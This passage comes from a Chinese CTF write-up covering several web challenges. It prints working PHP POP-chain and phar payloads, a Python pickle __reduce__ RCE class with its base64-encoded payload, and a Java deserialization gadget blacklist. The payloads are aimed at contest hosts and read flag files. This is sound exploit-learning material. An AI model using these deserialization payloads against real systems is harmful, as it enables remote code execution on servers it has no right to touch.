        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// 获取序列化后的字节  </span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// Base64 编码  </span>
        <span class="token class-name">String</span> base64 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// 输出  </span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Base64 Payload:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
        <span class="token comment">// 同时写入文件（可选）  </span>
        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"E:\\tao.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"E:\\tao.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">ObjectInputStream</span> objectIntputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        objectIntputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        objectIntputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span></code></pre>


<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">begin</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var2</span><span class="token punctuation">;</span>


<span class="token punctuation">&#125;</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">starlord</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var4</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var5</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>


<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">anna</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var6</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var7</span><span class="token punctuation">;</span>


<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">eenndd</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$command</span><span class="token punctuation">;</span>


<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">flaag</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var10</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var11</span><span class="token operator">=</span><span class="token string double-quoted-string">"1145141919810"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var10</span><span class="token operator">-></span><span class="token property">hey</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">var1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">anna</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">var1</span><span class="token operator">-></span><span class="token property">var6</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">starlord</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">var1</span><span class="token operator">-></span><span class="token property">var6</span><span class="token operator">-></span><span class="token property">var4</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">flaag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">var1</span><span class="token operator">-></span><span class="token property">var6</span><span class="token operator">-></span><span class="token property">var4</span><span class="token operator">-></span><span class="token property">var11</span><span class="token operator">=</span><span class="token number">213</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">var1</span><span class="token operator">-></span><span class="token property">var6</span><span class="token operator">-></span><span class="token property">var4</span><span class="token operator">-></span><span class="token property">var10</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">eenndd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">var1</span><span class="token operator">-></span><span class="token property">var6</span><span class="token operator">-></span><span class="token property">var4</span><span class="token operator">-></span><span class="token property">var10</span><span class="token operator">-></span><span class="token property">command</span><span class="token operator">=</span><span class="token string double-quoted-string">"passthru('t'.'ac'.chr(32).'/fl'.'ag');"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre>

<h3 id="include-upload"><a href="#include-upload" class="headerlink" title="include_upload"></a>include_upload</h3><p>参考<br><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">当include邂逅phar——DeadsecCTF2025 baby-web – fushulingのblog</a></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exploit.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$stub</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token string single-quoted-string">'STUB'</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

?></code></pre>
<p>生成一个phar，然后gzip压缩改名为1.phar.png即可</p>
<h3 id="双生序列"><a href="#双生序列" class="headerlink" title="双生序列"></a>双生序列</h3><p>首先是通过<code>$Bridge</code>进入<code>$Shark</code>往<code>/tmp/ssxl/run.bin</code>里面写东西</p>
<p>然后再run.php反序列化<code>$Pytools</code>运行py文件</p>
<p>py会读取<code>/tmp/ssxl/write.bin</code>pickle反序列化，注意绕过<code>secret</code>和<code>Set</code>类即可</p>
<p><code>/tmp/ssxl/write.bin</code>通过<code>$Writer</code></p>
<p>1.将触发pytools的反序列化流写入<code>/tmp/ssxl/run.bin</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Bridge</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$writer</span><span class="token punctuation">;</span>   
    <span class="token keyword">public</span> <span class="token variable">$shark</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cat</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pytools</span> <span class="token keyword">extends</span> <span class="token class-name">Cat</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$logbuf</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">Bridge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">write</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$b</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pytools</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">write</span><span class="token operator">-></span><span class="token property">ser</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge.bluesharkinfo.com:23717&#x2F;api.php?id&#x3D;1</code></pre>

<p>2.将base64 编码的pickle 字节流写入<code>tmp/ssxl/write.bin</code></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
command <span class="token operator">=</span> <span class="token string">"cat /flag > /tmp/ssxl/outs.txt"</span>

<span class="token keyword">class</span> <span class="token class-name">RCE</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>command<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Set</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>secret <span class="token operator">=</span> <span class="token string">b""</span>
        self<span class="token punctuation">.</span>payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>RCE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    set_obj <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token punctuation">)</span>
    pickled_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>set_obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>


<pre class="language-none"><code class="language-none">&lt;?php
class Writer &#123;
    public $b64data &#x3D;&quot;Y2NvcHlfcmVnCl9yZWNvbnN0cnVjdG9yCnAwCihjX19tYWluX18KU2V0CnAxCmNfX2J1aWx0aW5fXwpvYmplY3QKcDIKTnRwMwpScDQKKGRwNQpWc2VjcmV0CnA2CmNfX2J1aWx0aW5fXwpieXRlcwpwNwoodFJwOApzVnBheWxvYWQKcDkKY19jb2RlY3MKZW5jb2RlCnAxMAooVmNwb3NpeFx1MDAwYXN5c3RlbVx1MDAwYXAwXHUwMDBhKFZjYXQgL2ZsYWcgPiAvdG1wL3NzeGwvb3V0cy50eHRcdTAwMGFwMVx1MDAwYXRwMlx1MDAwYVJwM1x1MDAwYS4KcDExClZsYXRpbjEKcDEyCnRwMTMKUnAxNApzYi4&#x3D;&quot;;
    public $binfile &#x3D; &quot;&#x2F;tmp&#x2F;ssxl&#x2F;write.bin&quot;; 
	public $init &#x3D; &quot;fetch&quot;; 
	private $secret &#x3D; &quot;&quot;;
    
&#125;

$bridge &#x3D; new Writer();
$payload &#x3D; serialize($bridge);

echo &quot;blueshark:&quot; .$payload;
?&gt;</code></pre>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251205195326.png" alt="image.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge.bluesharkinfo.com:23717&#x2F;api.php?id&#x3D;2</code></pre>

<p>最后执行py文件</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge.bluesharkinfo.com:23717&#x2F;run.php?action&#x3D;run</code></pre>


<h3 id="load-jvav"><a href="#load-jvav" class="headerlink" title="load_jvav"></a>load_jvav</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206201909.png" alt="image.png" loading="lazy"><br>直接读源码</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"ref"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes1 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token class-name">ByteArrayInputStream</span> bis<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes1<span class="token punctuation">)</span><span class="token punctuation">;</span>


                <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">safeSer</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>
                ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                msg<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">"备份成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                msg<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> msg<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span></code></pre>

<p>如果包含.ref后缀 base64解码然后反序列化</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">BLACKLIST</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>
            <span class="token comment">// Apache Commons Collections 相关类</span>
            <span class="token string">"org.apache.commons.collections.Transformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.functors.ChainedTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.functors.ConstantTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.functors.InvokerTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.functors.InstantiateTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.map.DefaultedMap"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.map.LazyMap"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections.map.TransformedMap"</span><span class="token punctuation">,</span>

            <span class="token comment">// Commons Collections4</span>
            <span class="token string">"org.apache.commons.collections4.Transformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections4.functors.ChainedTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections4.functors.ConstantTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections4.functors.InvokerTransformer"</span><span class="token punctuation">,</span>
            <span class="token string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span><span class="token punctuation">,</span>

            <span class="token comment">// 其他常见的危险类</span>

            <span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">,</span>
            <span class="token string">"java.rmi.server.UnicastRemoteObject"</span><span class="token punctuation">,</span>
            <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span>
            <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
            <span class="token comment">//解决一些非预期问题</span>
            <span class="token string">"springboot"</span><span class="token punctuation">,</span>
            <span class="token string">"springframework"</span><span class="token punctuation">,</span>
            <span class="token string">"com.fasterxml"</span><span class="token punctuation">,</span>
            <span class="token string">"jackson"</span><span class="token punctuation">,</span>
            <span class="token string">"org.yaml"</span><span class="token punctuation">,</span>
            <span class="token string">"org.thymeleaf"</span>


    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>黑名单类</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.exampORRAASDASDaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">></span></span>jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.build.sourceEncoding</span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.build.sourceEncoding</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.reporting.outputEncoding</span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.reporting.outputEncoding</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-boot.version</span><span class="token punctuation">></span></span>2.6.13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-boot.version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>


        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-actuator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>
